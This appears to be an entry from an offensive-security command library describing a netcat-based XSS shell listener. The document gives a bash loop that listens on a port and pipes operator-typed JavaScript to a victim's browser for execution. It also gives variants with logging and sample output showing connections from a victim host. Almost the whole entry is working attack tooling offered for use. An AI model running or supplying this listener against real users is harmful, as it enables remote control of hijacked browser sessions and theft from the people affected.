---
id: cmd-uuid-1
data: >-
  while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533
  >/dev/null; done
tags:
  - listener
  - xss-shell
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:43.723Z'
verified: false
validated: true
submitted: true
---
# netcat-xss-shell-listener

## Command

```bash
while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
```

## Description

Sets up an interactive loop using netcat to listen on port 533 for connections from an XSS payload, prompting for JS commands and piping them to the victim browser for execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output (twice for details) | Yes |
| `-l` | Listen mode | Yes |
| `-p 533` | Specify port 533 | Yes |
| `PORTNUMBER` | Replace 533 with desired port | Yes |

## Examples

### Basic Usage

```bash
while :; do printf "Shell>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
```

### Advanced Usage

Add logging: while :; do printf "Shell>$ "; read c; echo $c | nc -vvlp 533 | tee shell.log >/dev/null; done

## Expected Output

Prompts like 'ZephrFishHackerOne>$ ', connection details: 'connect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIMIP] 55730 sent 15, rcvd 245'.

## Related

- [[Related Procedure: Set-Up-Netcat-Listener-for-XSS-Shell]]
